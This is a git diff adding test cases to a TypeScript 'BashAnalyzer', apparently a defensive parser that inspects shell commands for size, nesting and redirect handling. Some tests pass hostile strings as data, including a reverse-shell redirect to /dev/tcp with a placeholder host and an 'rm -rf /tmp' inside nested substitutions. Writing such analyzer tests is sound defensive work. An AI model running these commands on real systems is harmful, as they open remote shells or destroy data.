@@ -319,3 +319,56 @@ describe("BashAnalyzer — H5: shell -c flag clusters", () => {
 		expect(r.commands.map((c) => c.argv[0])).toEqual(["bash"]);
 	});
 });
+
+describe("BashAnalyzer — H4/M7/M8: limits", () => {
+	it("rejects oversized input", async () => {
+		const big = `echo ${"a".repeat(70000)}`;
+		const r = await analyzer.analyze(big);
+		expect(r.parseError).toMatch(/maximum size/);
+	});
+
+	it("rejects deeply nested substitutions", async () => {
+		// Build $(echo $(echo $(... 20 levels deep ...)))
+		let cmd = "echo rm";
+		for (let i = 0; i < 20; i++) cmd = `echo $(${cmd})`;
+		const r = await analyzer.analyze(cmd);
+		expect(r.parseError).toMatch(/nesting depth/);
+	});
+
+	it("does not flag depth for normal nesting (3 levels)", async () => {
+		const r = await analyzer.analyze("echo $(echo $(rm -rf /tmp))");
+		expect(r.parseError).toBeUndefined();
+		expect(r.commands.map((c) => c.argv[0])).toContain("rm");
+	});
+
+	it("rejects too many commands", async () => {
+		// 300 commands separated by ;
+		const many = Array.from({ length: 300 }, () => "true").join(" ; ");
+		const r = await analyzer.analyze(many);
+		expect(r.parseError).toMatch(/too many|>256/);
+	});
+});
+
+describe("BashAnalyzer — redirect honesty", () => {
+	it("captures 2>&1 with fd in op", async () => {
+		const r = await analyzer.analyze("cat foo 2>&1");
+		expect(r.commands[0]?.redirects.length).toBeGreaterThan(0);
+		const redir = r.commands[0]?.redirects[0];
+		// op should include the fd number: "2>&"
+		expect(redir?.op).toMatch(/2/);
+		// target should be "1" (the destination fd)
+		expect(redir?.target).toBe("1");
+	});
+
+	it("captures redirects on a piped command (bash -i >& /dev/tcp/...)", async () => {
+		const r = await analyzer.analyze("bash -i >& /dev/tcp/host/port");
+		expect(r.commands[0]?.redirects.length).toBeGreaterThan(0);
+		expect(r.commands[0]?.redirects[0]?.target).toBe("/dev/tcp/host/port");
+	});
+
+	it("captures redirects when the command is in a pipe", async () => {
+		const r = await analyzer.analyze("cat foo > out | grep bar");
+		const cat = r.commands.find((c) => c.argv[0] === "cat");
+		expect(cat?.redirects.some((redir) => redir.target === "out")).toBe(true);
+	});
+});
